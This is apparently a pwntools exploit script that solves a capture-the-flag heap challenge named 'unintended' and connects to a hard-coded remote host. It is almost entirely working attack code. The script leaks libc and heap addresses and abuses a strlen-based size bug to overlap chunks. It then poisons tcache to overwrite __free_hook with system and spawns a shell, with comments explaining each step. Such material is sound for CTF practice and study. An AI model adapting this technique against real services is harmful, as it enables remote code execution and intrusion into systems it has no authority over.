#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'info'

exe = ELF('./unintended')
libc = ELF('./lib/libc.so.6')
rop = ROP(exe)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6')

host, port = "193.57.159.27", "55446"

if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = gdb.debug([exe.path], gdbscript = '''
    source ~/gdb.plugins/gef/gef.py
    b main
    c
    pie breakpoint *0x15be
    c
     ''')
  else:
    p = process(exe.path)


def add(idx,categ,name,length,descr,points):
  p.sendlineafter('> ', '1')
  p.sendlineafter('number: ', str(idx))
  p.sendlineafter('category: ', categ)
  p.sendlineafter('name: ', name)
  p.sendlineafter('length: ', str(length))
  p.sendafter('description: ', descr)
  p.sendlineafter('Points: ', str(points))

def patch(idx,descr):
  p.sendlineafter('> ', '2')
  p.sendlineafter('number: ', str(idx))
  p.sendafter('description: ', descr)

def deploy(idx):
  p.sendlineafter('> ', '3')
  p.sendlineafter('number: ', str(idx))

def free(idx):
  p.sendlineafter('> ', '4')
  p.sendlineafter('number: ', str(idx))



add(0,'web', 'A', 0x428, 'aaa', 1000)
add(1,'web', 'B', 0x38, 'aaa', 1000)
add(2,'web', 'C', 0x38, 'aaa', 1000)
free(0)
free(2)
free(1)
add(0,'web', 'A', 0x428, '\xa0', 1000)
# we leak a libc address to calculate libc base
deploy(0)
p.readuntil('Description: ',drop=True)
libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00'))- 0x3ebca0
print('libc base = {:#x}'.format(libc.address))

add(1,'X', 'B', 0x38, '\x80', 1000)
# we leak a heap address to calculate heap base
deploy(1)
p.readuntil('Description: ',drop=True)
heap_base = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00'))- 0x780
print('heap base = {:#x}'.format(heap_base))

#
# try chunk overlapp micmac, like in https://github.com/shellphish/how2heap/blob/master/glibc_2.27/overlapping_chunks.c
# basically, we allocate 3 blocs, we free the one in the middle, 
# then we use strlen bloc size calculation bug, to overwrite next bloc size.. when editing 1st bloc, and set size from 0x501 to 0x581
# then we free the 3rd bloc , a tcache one of 0x80 size..  then we allocate a bloc of 0x578 (0x580)  that will overlap the freed tcache bloc o f 0x80
# we do a tcache poisonning on third bloc (the freed one)
# to have an allocation on __free_hook
#
# end of the story
#
add(2,'web', 'A', 0x4f8, 'a'*0x4f8, 1000)
add(3,'web', 'B', 0x4f8, 'b'*0x4f8, 1000)
add(4,'web', 'C', 0x78, 'c'*0x78, 1000)
free(3)
patch(2,'A'*0x4f8+p16(0x581))
free(4)
payload = 'D'*0x530+p64(0)+p64(0x81)+p64(libc.symbols['__free_hook'])+p64(heap_base+0x10)
add(3,'web', 'D', 0x578, payload, 1000)

add(5,'web', 'E', 0x78, '/bin/sh\x00', 1000)
add(6,'web', 'F', 0x78, p64(libc.symbols['system']), 1000)

free(5)

p.interactive()

